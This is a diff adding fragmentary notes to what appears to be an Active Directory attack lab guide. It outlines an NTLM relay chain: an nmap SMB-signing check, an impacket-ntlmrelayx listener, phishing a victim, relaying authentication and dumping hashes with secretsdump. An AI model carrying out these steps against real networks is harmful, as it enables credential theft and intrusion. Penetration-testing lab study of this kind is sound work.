@@ -13,6 +13,29 @@
 4. **[Attacker (Kali)]** Relays Auth -> **[Target (Windows)]** (Bypass Auth)
 5. **[Attacker (Kali)]** `proxychains secretsdump.py` -> **[Target (Windows)]** (Dump Hashes via SOCKS)
 
+
+
+
+# 1. Recon & Setup: Check SMB signing a
+nmap --script=smb2-security-mode.nse -p445 10.0.2.73
+
+# 2. Start impacket-ntlmrelayx listener
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# 3. phishing to make Victim connect back to Attacker as SMB service 
+
+
+# 4. Attack Execution (Choose one method below)
+victim connects back to ntlrelayx listener
+
+
+# 5. Attack Execution (Choose one method below)
+ntlmrelayx , relays auth to target server , 
+
+# 6. leverage that to dump hashes
+
+
+
 ---
 
 ## Scenario 2: AS-REP Roasting
